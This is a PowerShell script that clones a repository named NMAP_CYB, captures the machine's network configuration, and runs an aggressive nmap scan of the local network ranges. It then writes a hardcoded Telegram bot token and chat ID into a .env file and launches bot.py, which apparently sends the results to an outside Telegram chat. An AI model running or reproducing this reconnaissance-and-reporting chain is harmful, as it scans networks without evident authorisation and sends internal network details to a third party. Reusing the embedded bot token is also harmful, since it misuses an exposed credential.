# Install dependencies
Write-Host "Installing dependencies..."
pip install python-dotenv

# Navigate to Documents folder
cd ~/Documents/

# Create necessary files and directories
Write-Host "Setting up files and directories..."
New-Item -ItemType File -Name "network_ips.txt" -Force
New-Item -ItemType Directory -Name "nmapp" -Force
cd ./nmapp/

# Clone the GitHub repository
Write-Host "Cloning the NMAP_CYB repository..."
git clone https://github.com/JanKastelic1/NMAP_CYB.git
cd ..

# Run networking commands
Write-Host "Capturing network configuration..."
ipconfig | Out-File -FilePath ifconfig_output.txt
Select-String -Pattern 'IPv4|Subnet' -Path ifconfig_output.txt | Out-File -FilePath inet_mask_output.txt

# Navigate to the cloned project directory
Write-Host "Navigating to the project directory and running netips.py..."
cd ./nmapp/NMAP_CYB/
python netips.py

# Run Nmap scan (ensure the network_ips.txt file exists)
Write-Host "Running Nmap scan..."
nmap -T5 -F --min-parallelism 100 -iL ~/Documents/network_ips.txt -oN ~/Documents/scan_results.txt --exclude 127.0.0.0/8

# Create .env file for Telegram Bot integration
Write-Host "Setting up the Telegram bot configuration..."
cd ~/Documents/nmapp/NMAP_CYB/
New-Item -ItemType File -Name ".env" -Force
Add-Content -Path .env -Value "TELEGRAM_BOT_TOKEN=7705762228:AAG3jKGXa8FnUZZ6FaWKznQa02y7TShu_fk"
Add-Content -Path .env -Value "TELEGRAM_CHAT_ID=-4531222193"

# Run the Telegram bot script
Write-Host "Running Telegram bot..."
python bot.py
